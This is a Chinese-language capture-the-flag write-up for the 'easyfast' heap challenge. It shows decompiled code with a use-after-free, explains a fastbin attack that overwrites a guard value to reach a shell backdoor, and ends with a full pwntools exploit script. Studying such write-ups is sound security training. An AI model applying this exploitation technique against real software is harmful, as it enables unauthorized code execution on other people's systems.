# wustctf_2020_easyfast
https://xz.aliyun.com/news/11725

类型：fastbinattack double free
版本：Ubuntu16

## ida
### main
```c
void sub_400ACD()
{
  char s[8]; // [rsp+0h] [rbp-20h] BYREF
  __int64 v1; // [rsp+8h] [rbp-18h]
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  *(_QWORD *)s = 0LL;
  v1 = 0LL;
  while ( 1 )
  {
    puts("choice>");
    fgets(s, 8, stdin);
    switch ( atoi(s) )
    {
      case 1:
        sub_400916();  //add
        break;
      case 2:
        sub_4009D7(s, 8LL);  //delete
        break;
      case 3:
        sub_400A4D(s, 8LL);  //edit
        break;
      case 4:
        sub_400896(s, 8LL);  //backdoor
        break;
      case 5:
        exit(0);
      default:
        puts("invalid");
        break;
    }
  }
}
```
### add
```c
unsigned __int64 sub_400916()
{
  int v0; // eax
  int v1; // ebx
  char s[24]; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 v4; // [rsp+28h] [rbp-18h]

  v4 = __readfsqword(0x28u);
  if ( dword_6020BC <= 3 )  //只能申请4个堆块
  {
    puts("size>");
    fgets(s, 8, stdin);
    v0 = atoi(s);
    if ( v0 && (unsigned __int64)v0 <= 120 )
    {
      v1 = dword_6020BC++;
      *(&buf + v1) = malloc(v0);
    }
    else
    {
      puts("No need");
    }
  }
  else
  {
    puts("No need");
  }
  return __readfsqword(0x28u) ^ v4;
}
```
### delete
```c
unsigned __int64 sub_4009D7()
{
  __int64 v1; // [rsp+8h] [rbp-28h]
  char s[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("index>");
  fgets(s, 8, stdin);
  v1 = atoi(s);
  free(*(&buf + v1));   //uaf
  return __readfsqword(0x28u) ^ v3;
}
### edit
```c
unsigned __int64 sub_400A4D()
{
  __int64 v1; // [rsp+8h] [rbp-28h]
  char s[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("index>");
  fgets(s, 8, stdin);
  v1 = atoi(s);
  read(0, *(&buf + v1), 8uLL);
  return __readfsqword(0x28u) ^ v3;
}
```

### backdoor
```c
int sub_400896()
{
  int result; // eax

  if ( qword_602090 )  //储存的值是1   改成0就可以往下执行，就可以提权了
    result = puts("Not yet");
  else
    result = system("/bin/sh");
  return result;
}
```

### qword_602090
```
.data:0000000000602090 qword_602090    dq 1                    ; DATA XREF: sub_400896+4↑r
.data:0000000000602090 _data           ends
.data:0000000000602090
```
## double free的原理
在删除堆的时候没有对指针进行归零操作，然后重复free同一个chunk试其的fd形成一个循环 此时我们就可以通过在第二次申请该chunk的时候让同一个chunk拥有写入和执行的权限

## 思路
通过存在的uaf漏洞在fastbin链表中去进行堆块的构造，让第一个free掉的chunk的fd指针指向需要修改的bss段数值的-0x10的位置(这里就是个伪造一个堆块)
``` 
pwndbg> bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0xb3d000  →  0x602080  ←  0x1
0x60: 0x0
0x70: 0x0
0x80: 0x0
```


然后把伪造的堆块当成真正的chunk去申请，然后再修改这个伪造chunk的fd指针处的数值，就能成功的getshell

| **Chunk**   | **字段** | **值**             | **描述**                          |
|-------------|----------|--------------------|-----------------------------------|
| **chunk0**  | pre size | -                  | 前一个 chunk 的大小（此处未显示） |
| **chunk0**  | size     | -                  | 当前 chunk 的大小（此处未显示）   |
| **chunk0**  | fd       | -                  | 前向指针（此处未显示）            |
| **chunk0**  | bk       | -                  | 后向指针（此处未显示）            |
| **false chunk** | -       | `0x602080`         | fd 指针指向的地址                 |
| **false chunk** | -       | -                  | （未知字段）                      |
| **false chunk** | -       | -                  | （未知字段）                      |
| **false chunk** | -       | `1`                | 存储的值为 1                      |
| **false chunk** | -       | `0x602090`         | bk 指针指向的地址                 |


## exp
```python
from pwn import *

context(os='linux',arch='amd64',log_level='debug')
io=process('./pwn')

def duan():
    gdb.attach(io)
    pause()

def add(size):
    io.recvuntil(b'choice>\n')
    io.sendline(b'1')
    io.recvuntil(b'size>\n')
    io.sendline(str(size))

def delete(index):
    io.recvuntil(b'choice>\n')
    io.sendline(b'2')
    io.recvuntil(b'index>\n')
    io.sendline(str(index))

def edit(index,content):
    io.recvuntil(b'choice>\n')
    io.sendline(b'3')
    io.recvuntil(b'index>\n')
    io.sendline(str(index))
    io.send(content)

def backdoor():
    io.recvuntil(b'choice>\n')
    io.sendline(b'4')


#io.recvuntil("_\\_\\ \n")
add(0x40)  #chunk0
add(0x20)  #chunk1

delete(0)  #free chunk0
#duan()
edit(0,p64(0x602080))

add(0x40)
add(0x40)

edit(3,p64(0))
backdoor()
io.interactive()
```